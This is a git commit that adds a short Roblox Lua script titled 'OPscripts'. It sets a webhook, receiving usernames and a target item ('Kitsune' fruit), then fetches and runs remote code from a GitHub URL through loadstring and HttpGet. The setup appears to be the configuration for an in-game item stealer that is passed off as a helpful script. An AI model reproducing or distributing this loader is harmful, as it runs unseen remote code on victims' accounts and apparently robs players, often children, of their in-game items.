58c98ea4162ddf35ccb732f811e24b2118ac3e21
kn-h0b <nebisatyusifova@gmail.com>
2025-04-06 20:43:41 +0400

    Create OPscripts.lua

---
+++ OPscripts.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=ODdkV0dMODg0WmxmdDhGWDZRWExBQTppdzE3T29NLU1FREU1Y0lQSzhiczBTRU1ja3RwVnpVajhPaXpMc0dqdThSaFI1dWdiQWk2NHMzeS1hOU4wdGVrQ2JhYjk2c1lHdmg1YVpDeUJlX3pNSl9JX3pQc3BaZVFYVFJ3NkQ2RExiVldTcG9wTXdqRjVPR3dwQW9RcVBOYUxkbDNvbDhIdm9NU3Y2cGFVcmVBN1otVU85aXV2TEVpYjNONldZSE5zYnM" -- << Your Webhook
+Usernames = {"AWALS2011", "im_kiddd8","im_kiddd9"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
